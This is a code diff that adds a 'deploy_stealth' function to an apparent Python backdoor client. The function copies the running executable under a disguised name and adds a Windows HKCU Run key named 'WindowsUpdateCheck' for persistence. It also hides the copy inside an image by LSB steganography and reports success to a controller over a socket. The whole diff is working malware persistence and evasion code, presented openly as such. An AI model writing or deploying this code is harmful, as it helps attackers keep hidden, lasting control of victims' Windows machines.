@@ -400,6 +400,58 @@ def extract_from_image(image_path, output_filename="extracted.exe", auto_run=Fal
     return None
 
 
+# Deploys the backdoor using all three techniques in one command:
+# 1. Copy + rename + relocate (Masquerading)
+# 2. Add to Registry Run Key (Persistence)
+# 3. Hide the copy inside an image using LSB steganography
+# Pseudocode:
+# 1. Copy current executable to new location with new name
+# 2. Add new copy path to HKCU Run key
+# 3. Hide the new copy inside the carrier image
+def deploy_stealth(new_name, target_path, carrier_img, sock):
+  try:
+    original_path = os.path.abspath(sys.argv[0])
+    
+    # Ensure target directory exists
+    target_dir = os.path.dirname(target_path)
+    if target_dir:
+      os.makedirs(target_dir, exist_ok=True)
+
+    # 1. Create copy with new name and location (Masquerading)
+    shutil.copy2(original_path, target_path)
+    print(f"[+] Created masqueraded copy: {target_path}")
+
+    # 2. Add to Windows Registry Run Key (Persistence)
+    try:
+      key = reg.OpenKey(reg.HKEY_CURRENT_USER,
+                        r"Software\Microsoft\Windows\CurrentVersion\Run",
+                        0, reg.KEY_SET_VALUE)
+      reg.SetValueEx(key, "WindowsUpdateCheck", 0, reg.REG_SZ, target_path)
+      reg.CloseKey(key)
+      print(f"[+] Added persistence to HKCU Run key")
+    except Exception as reg_err:
+      print(f"[!] Registry persistence warning: {reg_err}")
+
+    # 3. Hide the copied file inside the image (Steganography)
+    hidden_image_name = "update_" + os.path.basename(carrier_img)
+    hide_success = hide_file_in_image(target_path, carrier_img, hidden_image_name)
+
+    if hide_success:
+      success_msg = (
+        f"STEALTH_OK|Stealth Deployment Successful!\n"
+        f"• File copied to: {target_path}\n"
+        f"• Registry Run Key: Added\n"
+        f"• Hidden in image: {hidden_image_name}"
+      )
+      sock.send(success_msg.encode("utf-8"))
+      print("[+] Full stealth deployment completed successfully!")
+    else:
+      sock.send(b"STEALTH_ERR|Failed to hide file in image")
+
+  except Exception as e:
+    error_msg = f"STEALTH_ERR|Deployment failed: {str(e)}"
+    print(error_msg)
+    sock.send(error_msg.encode("utf-8"))
 
 
 ###
